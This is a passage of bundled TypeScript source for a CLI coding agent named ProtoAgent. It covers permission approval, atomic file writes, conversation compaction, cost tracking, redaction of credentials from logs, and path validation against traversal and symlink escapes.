const sessionApprovals = new Set<string>(); // stores approval keys scoped by session

// Callback that the Ink UI provides to handle interactive approval
let approvalHandler: ((req: ApprovalRequest) => Promise<ApprovalResponse>) | null = null;

export function setDangerouslySkipPermissions(value: boolean): void {
  dangerouslySkipPermissions = value;
}

export function isDangerouslySkipPermissions(): boolean {
  return dangerouslySkipPermissions;
}

export function setApprovalHandler(handler: (req: ApprovalRequest) => Promise<ApprovalResponse>): void {
  approvalHandler = handler;
}

export function clearApprovalHandler(): void {
  approvalHandler = null;
}

export function clearSessionApprovals(): void {
  sessionApprovals.clear();
}

function getApprovalScopeKey(req: ApprovalRequest): string {
  const sessionId = req.sessionId ?? '__global__';
  const scope = req.sessionScopeKey ?? req.type;
  return \`\${sessionId}:\${scope}\`;
}

/**
 * Request approval for an operation. Returns true if approved.
 *
 * Check order:
 *  1. --dangerously-skip-permissions → auto-approve
 *  2. Session approval for this type → auto-approve
 *  3. Interactive prompt via the UI handler
 *  4. No handler registered → reject (fail closed)
 */
export async function requestApproval(req: ApprovalRequest): Promise<boolean> {
  if (dangerouslySkipPermissions) return true;

  const sessionKey = getApprovalScopeKey(req);
  if (sessionApprovals.has(sessionKey)) return true;

  if (!approvalHandler) {
    return false;
  }

  const response = await approvalHandler(req);

  switch (response) {
    case 'approve_once':
      return true;
    case 'approve_session':
      sessionApprovals.add(sessionKey);
      return true;
    case 'reject':
      return false;
    default:
      return false;
  }
}
`,
  },
  {
    path: "src/utils/atomic-write.ts",
    content: `/**
 * Atomic file write utility with symlink attack protection.
 *
 * Security: Uses O_CREAT|O_EXCL to prevent TOCTOU race conditions.
 * Naive approach: fs.writeFile(tmpPath, content) then fs.rename()
 * Risk: Attacker creates symlink at tmpPath, causing write to arbitrary location
 * Fix: Use 'wx' flag (O_CREAT|O_EXCL) - fails if file exists, prevents following symlinks
 */

import fs, { type FileHandle } from 'node:fs/promises';
import path from 'node:path';

export interface AtomicWriteResult {
  success: boolean;
  bytesWritten: number;
  error?: string;
}

/**
 * Atomically write content to a file with symlink protection.
 *
 * This function protects against symlink attacks by:
 * 1. Creating a temporary file with O_CREAT|O_EXCL (fails if file exists)
 * 2. Writing content and syncing to disk
 * 3. Renaming atomically to target (atomic on same filesystem)
 *
 * @param targetPath - The final path for the file (must be validated)
 * @param content - The content to write
 * @returns AtomicWriteResult indicating success/failure
 *
 * @example
 * \`\`\`typescript
 * const result = await atomicWriteFile('/path/to/file.txt', 'content');
 * if (!result.success) {
 *   console.error('Write failed:', result.error);
 * }
 * \`\`\`
 */
export async function atomicWriteFile(
  targetPath: string,
  content: string
): Promise<AtomicWriteResult> {
  const tmpName = \`.protoagent-tmp-\${process.pid}-\${Date.now()}-\${Math.random().toString(36).slice(2)}-\${path.basename(targetPath)}\`;
  const tmpPath = path.join(path.dirname(targetPath), tmpName);

  let fd: FileHandle | undefined;
  let bytesWritten = 0;

  try {
    // Security: Open with O_CREAT|O_EXCL ('wx' flag)
    // - Creates file only if it doesn't exist
    // - Fails if a symlink exists at the path (prevents following symlinks)
    fd = await fs.open(tmpPath, 'wx', 0o600);

    // Write content and get bytes written
    const buffer = Buffer.from(content, 'utf8');
    const writeResult = await fd.write(buffer);
    bytesWritten = writeResult.bytesWritten;

    // Sync to ensure data hits disk before rename (durability)
    await fd.sync();
    await fd.close();
    fd = undefined;

    // Atomic rename (only works atomically if same filesystem)
    await fs.rename(tmpPath, targetPath);

    return { success: true, bytesWritten };
  } catch (err: any) {
    // Ensure file handle is closed
    if (fd !== undefined) {
      try { await fd.close(); } catch { /* ignore */ }
    }

    // Attempt cleanup of temp file
    try {
      await fs.unlink(tmpPath);
    } catch {
      // File might not exist, ignore cleanup errors
    }

    return {
      success: false,
      bytesWritten: 0,
      error: err?.message || String(err),
    };
  }
}

/**
 * Convenience function that throws on error instead of returning result.
 * Use this when you want errors to propagate.
 */
export async function atomicWriteFileOrThrow(
  targetPath: string,
  content: string
): Promise<number> {
  const result = await atomicWriteFile(targetPath, content);
  if (!result.success) {
    throw new Error(result.error || 'Atomic write failed');
  }
  return result.bytesWritten;
}
`,
  },
  {
    path: "src/utils/compactor.ts",
    content: `/**
 * Conversation compaction.
 *
 * When the conversation approaches the context window limit (≥ 90%),
 * the compactor summarises the older messages using the LLM and replaces
 * them with a compact summary. The most recent messages are kept
 * verbatim so the agent doesn't lose immediate context.
 */

import type OpenAI from 'openai';
import { estimateConversationTokens } from './cost-tracker.js';
import { logger } from './logger.js';
import { getTodosForSession, type TodoItem } from '../tools/todo.js';

const RECENT_MESSAGES_TO_KEEP = 5;

function isProtectedSkillMessage(message: OpenAI.Chat.Completions.ChatCompletionMessageParam): boolean {
  return message.role === 'tool' && typeof message.content === 'string' && message.content.includes('<skill_content ');
}

const COMPRESSION_PROMPT = \`You are a conversation state manager. Your job is to compress a conversation history into a compact summary that preserves all important context.

Produce a structured summary in this format:

<state_snapshot>
<overall_goal>What the user is trying to accomplish</overall_goal>
<key_knowledge>Important facts, conventions, constraints discovered</key_knowledge>
<file_system_state>Files created, read, modified, or deleted (with paths)</file_system_state>
<recent_actions>Last significant actions and their outcomes</recent_actions>
<current_plan>Current step-by-step plan with status: [DONE], [IN PROGRESS], [TODO]</current_plan>
</state_snapshot>

Be thorough but concise. Do not lose any information that would be needed to continue the conversation.\`;

/**
 * Compact a conversation if it exceeds the context window threshold.
 * Returns the original messages if compaction isn't needed or fails.
 */
export async function compactIfNeeded(
  client: OpenAI,
  model: string,
  messages: OpenAI.Chat.Completions.ChatCompletionMessageParam[],
  contextWindow: number,
  currentTokens: number,
  requestDefaults: Record<string, unknown> = {},
  sessionId?: string
): Promise<OpenAI.Chat.Completions.ChatCompletionMessageParam[]> {
  const utilisation = (currentTokens / contextWindow) * 100;
  if (utilisation < 90) return messages;

  logger.info(\`Compacting conversation (\${utilisation.toFixed(1)}% of context window used)\`);

  try {
    return await compactConversation(client, model, messages, requestDefaults, sessionId);
  } catch (err) {
    logger.error(\`Compaction failed, continuing with original messages: \${err}\`);
    return messages;
  }
}

async function compactConversation(
  client: OpenAI,
  model: string,
  messages: OpenAI.Chat.Completions.ChatCompletionMessageParam[],
  requestDefaults: Record<string, unknown>,
  sessionId?: string
): Promise<OpenAI.Chat.Completions.ChatCompletionMessageParam[]> {
  // Separate system message, history to compress, and recent messages
  const systemMessage = messages[0];
  const recentMessages = messages.slice(-RECENT_MESSAGES_TO_KEEP);
  const middleMessages = messages.slice(1, messages.length - RECENT_MESSAGES_TO_KEEP);
  const protectedMessages = middleMessages.filter(isProtectedSkillMessage);
  const historyToCompress = middleMessages.filter((message) => !isProtectedSkillMessage(message));

  if (historyToCompress.length === 0) {
    logger.debug('Nothing to compact — conversation too short');
    return messages;
  }

  // Build compression request
  const activeTodos = getTodosForSession(sessionId);
  const todoReminder = activeTodos.length > 0
    ? \`\\n\\nActive TODOs:\\n\${activeTodos.map((todo: TodoItem) => \`- [\${todo.status}] \${todo.content}\`).join('\\n')}\\n\\nThe agent must not stop until the TODO list is fully complete. Preserve that instruction in the summary if work remains.\`
    : '';

  const compressionMessages: OpenAI.Chat.Completions.ChatCompletionMessageParam[] = [
    { role: 'system', content: COMPRESSION_PROMPT },
    {
      role: 'user',
      content: \`Here is the conversation history to compress:\\n\\n\${historyToCompress
        .map((m) => \`[\${(m as any).role}]: \${(m as any).content || JSON.stringify((m as any).tool_calls || '')}\`)
        .join('\\n\\n')}\${todoReminder}\`,
    },
  ];

  const response = await client.chat.completions.create({
    ...requestDefaults,
    model,
    messages: compressionMessages,
    max_tokens: 2000,
    temperature: 0.1,
  });

  const summary = response.choices[0]?.message?.content;
  if (!summary) {
    throw new Error('Compression returned empty response');
  }

  // Reconstruct: system + summary + recent messages
  const compacted: OpenAI.Chat.Completions.ChatCompletionMessageParam[] = [
    systemMessage,
    { role: 'system', content: \`Previous conversation summary:\\n\\n\${summary}\` },
    ...protectedMessages,
    ...recentMessages,
  ];

  const oldTokens = estimateConversationTokens(messages);
  const newTokens = estimateConversationTokens(compacted);
  logger.info(\`Compacted \${oldTokens} → \${newTokens} tokens (\${((1 - newTokens / oldTokens) * 100).toFixed(0)}% reduction)\`);

  return compacted;
}
`,
  },
  {
    path: "src/utils/cost-tracker.ts",
    content: `/**
 * Token estimation and cost tracking.
 *
 * Uses a rough heuristic (~4 chars per token) for estimation.
 * Prefers actual usage data from the API when available.
 */

import type OpenAI from 'openai';

export interface UsageInfo {
  inputTokens: number;
  outputTokens: number;
  totalTokens: number;
  estimatedCost: number;
}

export interface ContextInfo {
  currentTokens: number;
  maxTokens: number;
  utilizationPercentage: number;
  needsCompaction: boolean;
}

export interface ModelPricing {
  inputPerToken: number;
  outputPerToken: number;
  cachedPerToken?: number;
  contextWindow: number;
}

/** Rough token estimation: ~4 characters per token. */
export function estimateTokens(text: string): number {
  return Math.ceil(text.length / 4);
}

/** Estimate tokens for a single message including overhead. */
export function estimateMessageTokens(msg: OpenAI.Chat.Completions.ChatCompletionMessageParam): number {
  let tokens = 4; // per-message overhead
  if ('content' in msg && typeof msg.content === 'string') {
    tokens += estimateTokens(msg.content);
  }
  if ('tool_calls' in msg && msg.role === 'assistant' && Array.isArray(msg.tool_calls)) {
    for (const tc of msg.tool_calls) {
      // Type guard for function tool calls
      if (tc.type === 'function' && 'function' in tc) {
        tokens += estimateTokens(tc.function.name || '') + estimateTokens(tc.function.arguments || '') + 10;
      }
    }
  }
  return tokens;
}

/** Estimate total tokens for a conversation. */
export function estimateConversationTokens(messages: OpenAI.Chat.Completions.ChatCompletionMessageParam[]): number {
  return messages.reduce((sum, m) => sum + estimateMessageTokens(m), 0) + 10;
}

/** Calculate dollar cost for a given number of tokens. */
export function calculateCost(
  inputTokens: number,
  outputTokens: number,
  pricing: ModelPricing,
  cachedTokens?: number
): number {
  if (cachedTokens && cachedTokens > 0 && pricing.cachedPerToken != null) {
    const uncachedTokens = inputTokens - cachedTokens;
    return (
      uncachedTokens * pricing.inputPerToken +
      cachedTokens * pricing.cachedPerToken +
      outputTokens * pricing.outputPerToken
    );
  }
  return inputTokens * pricing.inputPerToken + outputTokens * pricing.outputPerToken;
}

/** Get context window utilisation info. */
export function getContextInfo(
  messages: OpenAI.Chat.Completions.ChatCompletionMessageParam[],
  pricing: ModelPricing
): ContextInfo {
  const currentTokens = estimateConversationTokens(messages);
  const maxTokens = pricing.contextWindow;
  const utilizationPercentage = (currentTokens / maxTokens) * 100;
  return {
    currentTokens,
    maxTokens,
    utilizationPercentage,
    needsCompaction: utilizationPercentage >= 90,
  };
}

/** Build a UsageInfo from actual or estimated token counts. */
export function createUsageInfo(
  inputTokens: number,
  outputTokens: number,
  pricing: ModelPricing,
  cachedTokens?: number
): UsageInfo {
  return {
    inputTokens,
    outputTokens,
    totalTokens: inputTokens + outputTokens,
    estimatedCost: calculateCost(inputTokens, outputTokens, pricing, cachedTokens),
  };
}
`,
  },
  {
    path: "src/utils/credential-filter.ts",
    content: `/**
 * Credential filtering utility for security.
 *
 * Redacts sensitive information from strings to prevent
 * credential leakage in logs, error messages, and output.
 *
 * Security Note:
 * Naive approach: Log/return strings as-is
 * Risk: API keys, tokens, and passwords leak in error messages,
 *       logs, session files, and terminal output
 * Fix: Centralized redaction patterns applied to all output
 */

// Patterns for common credential formats
const CREDENTIAL_PATTERNS: Array<{ pattern: RegExp; replacement: string }> = [
  // OpenAI API keys
  { pattern: /sk-[a-zA-Z0-9]{48}/g, replacement: 'sk-***REDACTED***' },
  // OpenAI project keys
  { pattern: /sk-proj-[a-zA-Z0-9_-]{100,}/g, replacement: 'sk-proj-***REDACTED***' },
  // Anthropic Claude keys
  { pattern: /sk-ant-[a-zA-Z0-9]{32,}/gi, replacement: 'sk-ant-***REDACTED***' },
  // Google AI/Gemini keys
  { pattern: /AIza[0-9A-Za-z_-]{35}/g, replacement: 'AIza***REDACTED***' },
  // Generic API key patterns
  { pattern: /api[_-]?key["\\']?\\s*[:=]\\s*["\\']?[a-zA-Z0-9_\\-]{20,}/gi, replacement: 'api_key=***REDACTED***' },
  // Bearer tokens
  { pattern: /Bearer\\s+[a-zA-Z0-9_\\-\\.]{20,}/g, replacement: 'Bearer ***REDACTED***' },
  // Authorization headers
  { pattern: /Authorization["\\']?\\s*:\\s*["\\']?Bearer\\s+[a-zA-Z0-9_\\-\\.]{20,}/gi, replacement: 'Authorization: Bearer ***REDACTED***' },
  // Password patterns
  { pattern: /password["\\']?\\s*[:=]\\s*["\\']?[^\\s"\\']{8,}/gi, replacement: 'password=***REDACTED***' },
  // Secret patterns
  { pattern: /secret["\\']?\\s*[:=]\\s*["\\']?[a-zA-Z0-9_\\-]{16,}/gi, replacement: 'secret=***REDACTED***' },
  // Token patterns
  { pattern: /token["\\']?\\s*[:=]\\s*["\\']?[a-zA-Z0-9_\\-\\.]{16,}/gi, replacement: 'token=***REDACTED***' },
  // AWS access keys
  { pattern: /AKIA[0-9A-Z]{16}/g, replacement: 'AKIA***REDACTED***' },
  // Private keys (SSH, PEM)
  { pattern: /-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----[\\s\\S]*?-----END (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/g, replacement: '***PRIVATE_KEY_REDACTED***' },
];

/**
 * Redact credentials from a string.
 *
 * @param text - The text to redact
 * @returns Text with credentials replaced
 *
 * Example:
 * \`\`\`typescript
 * const safe = maskCredentials("Error: API key sk-abc123 failed");
 * // Result: "Error: API key sk-***REDACTED*** failed"
 * \`\`\`
 */
export function maskCredentials(text: string): string {
  if (!text || typeof text !== 'string') {
    return text;
  }

  let result = text;
  for (const { pattern, replacement } of CREDENTIAL_PATTERNS) {
    result = result.replace(pattern, replacement);
  }
  return result;
}

/**
 * Deep redact credentials from an object.
 * Recursively traverses objects and arrays, redacting strings.
 *
 * @param obj - The object to redact
 * @returns A new object with credentials redacted
 */
export function maskCredentialsDeep(obj: unknown): unknown {
  if (typeof obj === 'string') {
    return maskCredentials(obj);
  }

  if (Array.isArray(obj)) {
    return obj.map(maskCredentialsDeep);
  }

  if (obj !== null && typeof obj === 'object') {
    const result: Record<string, unknown> = {};
    for (const [key, value] of Object.entries(obj)) {
      // Also mask the key name if it looks sensitive
      const maskedKey = maskCredentials(key);
      result[maskedKey] = maskCredentialsDeep(value);
    }
    return result;
  }

  return obj;
}

/**
 * Check if text contains potential credentials.
 * Useful for warning logs before outputting potentially sensitive data.
 *
 * @param text - The text to check
 * @returns True if credentials might be present
 */
export function containsCredentials(text: string): boolean {
  if (!text || typeof text !== 'string') {
    return false;
  }

  for (const { pattern } of CREDENTIAL_PATTERNS) {
    if (pattern.test(text)) {
      return true;
    }
  }
  return false;
}

/**
 * Create a safe preview of text that might contain credentials.
 * Shows first/last N chars with redaction applied.
 *
 * @param text - The text to preview
 * @param maxLength - Maximum total length of preview
 * @returns Safe preview string
 */
export function safePreview(text: string, maxLength = 200): string {
  const redacted = maskCredentials(text);

  if (redacted.length <= maxLength) {
    return redacted;
  }

  const half = Math.floor((maxLength - 20) / 2);
  return \`\${redacted.slice(0, half)}... (truncated, \${redacted.length} chars) ...\${redacted.slice(-half)}\`;
}
`,
  },
  {
    path: "src/utils/file-time.ts",
    content: `/**
 * File read-time tracking — staleness guard for edit_file.
 *
 * Ensures the model has read a file before editing it,
 * and that the file hasn't changed on disk since it was last read.
 */

import fs from 'node:fs';

const readTimes = new Map<string, number>(); // key: "sessionId:absolutePath" → epoch ms

/**
 * Record that a file was read at the current time.
 */
export function recordRead(sessionId: string, absolutePath: string): void {
  readTimes.set(\`\${sessionId}:\${absolutePath}\`, Date.now());
}

/**
 * Check that a file was previously read and hasn't changed on disk since.
 * Returns an error string if the check fails, or null if all is well.
 * Use this instead of assertReadBefore so staleness errors surface as normal
 * tool return values rather than exceptions that get swallowed into a generic
 * "Error executing edit_file: ..." message.
 */
export function checkReadBefore(sessionId: string, absolutePath: string): string | null {
  const key = \`\${sessionId}:\${absolutePath}\`;
  const lastRead = readTimes.get(key);

  if (!lastRead) {
    return \`You must read '\${absolutePath}' before editing it. Call read_file first.\`;
  }

  try {
    const mtime = fs.statSync(absolutePath).mtimeMs;
    if (mtime > lastRead + 100) {
      // Clear stale entry so the error message stays accurate on retry
      readTimes.delete(key);
      return \`'\${absolutePath}' has changed on disk since you last read it. Re-read it before editing.\`;
    }
  } catch (err: any) {
    if (err.code === 'ENOENT') {
      readTimes.delete(key);
      return \`'\${absolutePath}' no longer exists on disk.\`;
    }
    // Ignore other stat errors — don't block edits on stat failures
  }

  return null;
}

/**
 * Clear all read-time entries for a session (e.g. on session end).
 */
export function clearSession(sessionId: string): void {
  for (const key of readTimes.keys()) {
    if (key.startsWith(\`\${sessionId}:\`)) {
      readTimes.delete(key);
    }
  }
}
`,
  },
  {
    path: "src/utils/format-message.tsx",
    content: `import React from 'react';
import { Text } from 'ink';

/**
 * Parse Markdown-style formatting and render as Ink Text elements.
 *
 * Supports:
 * - **bold** → <Text bold>bold</Text>
 * - *italic* → <Text italic>italic</Text>
 * - ***bold italic*** → <Text bold italic>bold italic</Text>
 */

interface Segment {
  text: string;
  bold?: boolean;
  italic?: boolean;
}

function parseSegments(text: string): Segment[] {
  const segments: Segment[] = [];

  // Strip markdown header lines (e.g., "# Title" or "## Section")
  const cleaned = text.replace(/^#{1,6}\\s+.*\$/gm, '');

  // Pattern to match ***bold italic***, **bold**, *italic*
  const pattern = /(\\*\\*\\*[^*]+?\\*\\*\\*|\\*\\*[^*]+?\\*\\*|\\*[^\\s*][^*]*?\\*)/g;
  let lastIndex = 0;
  let match: RegExpExecArray | null;

  while ((match = pattern.exec(cleaned)) !== null) {
    // Add plain text before match
    if (match.index > lastIndex) {
      segments.push({ text: cleaned.slice(lastIndex, match.index) });
    }

    const fullMatch = match[0];
    let content: string;
    let bold = false;
    let italic = false;

    if (fullMatch.startsWith('***')) {
      content = fullMatch.slice(3, -3);
      bold = true;
      italic = true;
    } else if (fullMatch.startsWith('**')) {
      content = fullMatch.slice(2, -2);
      bold = true;
    } else {
      content = fullMatch.slice(1, -1);
      italic = true;
    }

    segments.push({ text: content, bold, italic });
    lastIndex = pattern.lastIndex;
  }

  // Add remaining plain text
  if (lastIndex < cleaned.length) {
    segments.push({ text: cleaned.slice(lastIndex) });
  }

  return segments.length > 0 ? segments : [{ text: cleaned }];
}

/**
 * Render formatted text as Ink Text elements.
 * Returns an array of <Text> components that can be nested inside a parent <Text>.
 */
export function renderFormattedText(text: string): React.ReactNode {
  const segments = parseSegments(text);

  if (segments.length === 1 && !segments[0].bold && !segments[0].italic) {
    return segments[0].text;
  }

  return segments.map((seg, i) => (
    <Text key={i} bold={seg.bold} italic={seg.italic}>
      {seg.text}
    </Text>
  ));
}
`,
  },
  {
    path: "src/utils/logger.ts",
    content: `/**
 * Logger utility with configurable log levels.
 *
 * Levels (from least to most verbose):
 *   ERROR (0) → WARN (1) → INFO (2) → DEBUG (3) → TRACE (4)
 *
 * Set the level via \`setLogLevel()\` or the \`--log-level\` CLI flag.
 * Logs are written to a file to avoid interfering with Ink UI rendering.
 */

import { appendFileSync, mkdirSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import { homedir } from 'node:os';
import { maskCredentials } from './credential-filter.js';

export enum LogLevel {
  ERROR = 0,
  WARN = 1,
  INFO = 2,
  DEBUG = 3,
  TRACE = 4,
}

let currentLevel: LogLevel = LogLevel.INFO;
let logFilePath: string | null = null;

// In-memory log buffer for UI display
export interface LogEntry {
  timestamp: string;
  level: LogLevel;
  message: string;
  context?: Record<string, unknown>;
}

let logBuffer: LogEntry[] = [];
let logListeners: Array<(entry: LogEntry) => void> = [];

export function setLogLevel(level: LogLevel): void {
  currentLevel = level;
}

export function getLogLevel(): LogLevel {
  return currentLevel;
}

export function onLog(listener: (entry: LogEntry) => void): () => void {
  logListeners.push(listener);
  // Return unsubscribe function
  return () => {
    logListeners = logListeners.filter(l => l !== listener);
  };
}

export function getRecentLogs(count: number = 50): LogEntry[] {
  return logBuffer.slice(-count);
}

export function initLogFile(): string {
  // Create logs directory
  const logsDir = join(homedir(), '.local', 'share', 'protoagent', 'logs');
  if (!existsSync(logsDir)) {
    mkdirSync(logsDir, { recursive: true });
  }

  // Create log file with timestamp
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  logFilePath = join(logsDir, \`protoagent-\${timestamp}.log\`);

  // Write header
  writeToFile(\`\\n\${'='.repeat(80)}\\nProtoAgent Log - \${new Date().toISOString()}\\n\${'='.repeat(80)}\\n\`);

  return logFilePath;
}

function writeToFile(message: string): void {
  if (!logFilePath) {
    initLogFile();
  }
  try {
    appendFileSync(logFilePath!, message);
  } catch (err) {
    // Emit to stderr since we can't write to log file
    process.stderr.write(\`Failed to write to log file: \${err}\\n\`);
  }
}

function timestamp(): string {
  const d = new Date();
  const hh = String(d.getHours()).padStart(2, '0');
  const mm = String(d.getMinutes()).padStart(2, '0');
  const ss = String(d.getSeconds()).padStart(2, '0');
  const ms = String(d.getMilliseconds()).padStart(3, '0');
  return \`\${hh}:\${mm}:\${ss}.\${ms}\`;
}

function safeStringify(obj: unknown): string {
  try {
    return JSON.stringify(obj);
  } catch {
    return '[Object with circular references]';
  }
}

function log(level: LogLevel, label: string, message: string, context?: Record<string, unknown>): void {
  if (level > currentLevel) return;
  const ts = timestamp();

  // Security: Redact credentials from log messages and context
  // Naive approach: Log messages as-is
  // Risk: API keys in error messages, tool outputs, or request data leak to log files
  // Attack: If logs are exposed, attacker gets API keys from log files
  const safeMessage = maskCredentials(message);
  const safeContext = context
    ? Object.fromEntries(
        Object.entries(context).map(([k, v]) => [
          k,
          typeof v === 'string' ? maskCredentials(v) : v,
        ])
      )
    : undefined;

  // Create log entry
  const entry: LogEntry = {
    timestamp: ts,
    level,
    message: safeMessage,
    context: safeContext,
  };

  // Add to buffer (keep last 100 entries)
  logBuffer.push(entry);
  if (logBuffer.length > 100) {
    logBuffer.shift();
  }

  // Notify listeners
  logListeners.forEach(listener => listener(entry));

  // Write to file
  const ctx = safeContext ? \` \${safeStringify(safeContext)}\` : '';
  writeToFile(\`[\${ts}] \${label.padEnd(5)} \${safeMessage}\${ctx}\\n\`);
}

export const logger = {
  error: (msg: string, ctx?: Record<string, unknown>) => log(LogLevel.ERROR, 'ERROR', msg, ctx),
  warn: (msg: string, ctx?: Record<string, unknown>) => log(LogLevel.WARN, 'WARN', msg, ctx),
  info: (msg: string, ctx?: Record<string, unknown>) => log(LogLevel.INFO, 'INFO', msg, ctx),
  debug: (msg: string, ctx?: Record<string, unknown>) => log(LogLevel.DEBUG, 'DEBUG', msg, ctx),
  trace: (msg: string, ctx?: Record<string, unknown>) => log(LogLevel.TRACE, 'TRACE', msg, ctx),

  /** Start a timed operation. Call the returned \`end()\` to log the duration. */
  startOperation(name: string): { end: () => void } {
    const start = performance.now();
    logger.debug(\`\${name} started\`);
    return {
      end() {
        const ms = (performance.now() - start).toFixed(1);
        logger.debug(\`\${name} completed\`, { durationMs: ms });
      },
    };
  },

  /** Get the path to the current log file */
  getLogFilePath(): string | null {
    return logFilePath;
  },
};
`,
  },
  {
    path: "src/utils/path-suggestions.ts",
    content: `/**
 * Path suggestions utility — Find similar paths when a file isn't found.
 *
 * Used by read_file and edit_file to suggest alternatives when
 * the requested path doesn't exist (helps recover from typos).
 */

import fs from 'node:fs/promises';
import path from 'node:path';
import { getWorkingDirectory } from './path-validation.js';

const MAX_DEPTH = 6;
const MAX_ENTRIES = 200;
const MAX_SUGGESTIONS = 3;

/**
 * Find similar paths when a requested file doesn't exist.
 * Walks from the repo root, matching segments case-insensitively.
 */
export async function findSimilarPaths(requestedPath: string): Promise<string[]> {
  const cwd = getWorkingDirectory();
  const segments = requestedPath.split('/').filter(Boolean);

  const candidates: string[] = [];

  async function walkSegments(dir: string, segIndex: number, currentPath: string): Promise<void> {
    if (segIndex >= segments.length || segIndex >= MAX_DEPTH || candidates.length >= MAX_SUGGESTIONS) return;

    const targetSegment = segments[segIndex].toLowerCase();
    let entries: string[];

    try {
      const dirEntries = await fs.readdir(dir, { withFileTypes: true });
      entries = dirEntries
        .slice(0, MAX_ENTRIES)
        .map(e => e.name);
    } catch {
      return;
    }

    const isLastSegment = segIndex === segments.length - 1;

    for (const entry of entries) {
      if (candidates.length >= MAX_SUGGESTIONS) break;
      const entryLower = entry.toLowerCase();

      // Match if entry contains the target segment as a substring (case-insensitive)
      if (!entryLower.includes(targetSegment) && !targetSegment.includes(entryLower)) continue;

      const entryPath = path.join(currentPath, entry);
      const fullPath = path.join(dir, entry);

      if (isLastSegment) {
        // Check if this file/dir actually exists
        try {
          await fs.stat(fullPath);
          candidates.push(entryPath);
        } catch {
          // skip
        }
      } else {
        // Continue walking deeper
        try {
          const stat = await fs.stat(fullPath);
          if (stat.isDirectory()) {
            await walkSegments(fullPath, segIndex + 1, entryPath);
          }
        } catch {
          // skip
        }
      }
    }
  }

  await walkSegments(cwd, 0, '');
  return candidates;
}
`,
  },
  {
    path: "src/utils/path-validation.ts",
    content: `/**
 * Path validation utility shared by all file tools.
 *
 * Ensures that every file path the agent operates on is within the
 * working directory (process.cwd()). Prevents directory traversal
 * and symlink escape attacks.
 */

import fs from 'node:fs/promises';
import path from 'node:path';

const workingDirectory = process.cwd();
let allowedRoots: string[] = [];

function isWithinRoot(targetPath: string, rootPath: string): boolean {
  const relative = path.relative(rootPath, targetPath);
  return relative === '' || (!relative.startsWith('..') && !path.isAbsolute(relative));
}

function isAllowedPath(targetPath: string): boolean {
  return isWithinRoot(targetPath, workingDirectory) || allowedRoots.some((root) => isWithinRoot(targetPath, root));
}

export async function setAllowedPathRoots(roots: string[]): Promise<void> {
  const normalizedRoots = await Promise.all(
    roots.map(async (root) => {
      const resolved = path.resolve(root);
      try {
        const realRoot = await fs.realpath(resolved);
        return [path.normalize(resolved), realRoot];
      } catch {
        return [path.normalize(resolved)];
      }
    })
  );

  allowedRoots = Array.from(new Set(normalizedRoots.flat()));
}

export function getAllowedPathRoots(): string[] {
  return [...allowedRoots];
}

/**
 * Resolve and validate a path. Throws if the path is outside cwd.
 * For files that don't exist yet, validates the parent directory.
 */
export async function validatePath(requestedPath: string): Promise<string> {
  const resolved = path.resolve(workingDirectory, requestedPath);
  const normalized = path.normalize(resolved);

  // First check: is the normalised path within cwd?
  if (!isAllowedPath(normalized)) {
    throw new Error(\`Path "\${requestedPath}" is outside the working directory.\`);
  }

  // Second check: resolve symlinks and re-check
  try {
    const realPath = await fs.realpath(normalized);
    if (!isAllowedPath(realPath)) {
      throw new Error(\`Path "\${requestedPath}" resolves (via symlink) outside the working directory.\`);
    }
    return realPath;
  } catch (err: any) {
    if (err.code === 'ENOENT') {
      // File doesn't exist yet — validate the parent directory instead
      const parentDir = path.dirname(normalized);
      try {
        const realParent = await fs.realpath(parentDir);
        if (!isAllowedPath(realParent)) {
          throw new Error(\`Parent directory of "\${requestedPath}" resolves outside the working directory.\`);
        }
        return path.join(realParent, path.basename(normalized));
      } catch {
        throw new Error(\`Parent directory of "\${requestedPath}" does not exist.\`);
      }
    }
    throw err;
  }
}

export function getWorkingDirectory(): string {
  return workingDirectory;
}
`,
  },
  {
    path: "tailwind.config.js",
    content: `/** @type {import('tailwindcss').Config} */
export default {
  content: ['./docs/**/*.{md,vue,ts}', './docs/.vitepress/**/*.{js,ts,vue}'],
  theme: {
    extend: {
      colors: {
        // ProtoAgent CLI green
        accent: {
          DEFAULT: '#09A469',
          light: '#0FD68C',
          dim: '#067A4E',
          bg: 'rgba(9, 164, 105, 0.08)',
          border: 'rgba(9, 164, 105, 0.2)',
        },
        // Dark surfaces
        dark: {
          black: '#0c0c0c',
          surface: '#141414',
          'surface-2': '#1a1a1a',
          border: '#2a2a2a',
          'border-bright': '#3a3a3a',
        },
        // Text colors
        text: {
          DEFAULT: '#c0c0c0',
          bright: '#f0f0f0',
          dim: '#999',
        },
      },
      fontFamily: {
        mono: ['IBM Plex Mono', 'Menlo', 'monospace'],
        sans: ['Instrument Sans', 'system-ui', 'sans-serif'],
      },
      fontSize: {
        xs: '0.65rem',
        sm: '0.8rem',
        base: '0.88rem',
        lg: '1.1rem',
        xl: '1.3rem',
        '2xl': '1.6rem',
        '3xl': '3rem',
      },
      backgroundColor: {
        black: '#0c0c0c',
        surface: '#141414',
        'surface-2': '#1a1a1a',
      },
      borderColor: {
        dark: '#2a2a2a',
      },
      textColor: {
        DEFAULT: '#c0c0c0',
        bright: '#f0f0f0',
        dim: '#999',
      },
    },
  },
  plugins: [],
}
`,
  },
  {
    path: "tsconfig.json",
    content: `{
  "compilerOptions": {
    "target": "ES2022",
    "module": "NodeNext",
    "moduleResolution": "NodeNext",
    "jsx": "react-jsx",
    "outDir": "./dist",
    "rootDir": "./src",
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "forceConsistentCasingInFileNames": true,
    "lib": ["ES2022"],
    "types": ["node"]
  },
  "include": ["src/**/*"],
  "exclude": ["node_modules", "dist"]
}
`,
  }
];
